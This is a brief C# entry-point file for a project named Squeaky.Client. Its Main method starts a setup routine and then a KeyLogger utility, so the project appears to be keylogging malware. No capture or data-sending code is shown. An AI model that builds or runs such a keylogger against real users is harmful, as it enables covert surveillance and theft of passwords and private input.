using System;

namespace Squeaky.Client
{
    class Program
    {
        static void Main(string[] args)
        {
            Setup.Start();
            Utilities.KeyLogger.Start();
        }
    }
}
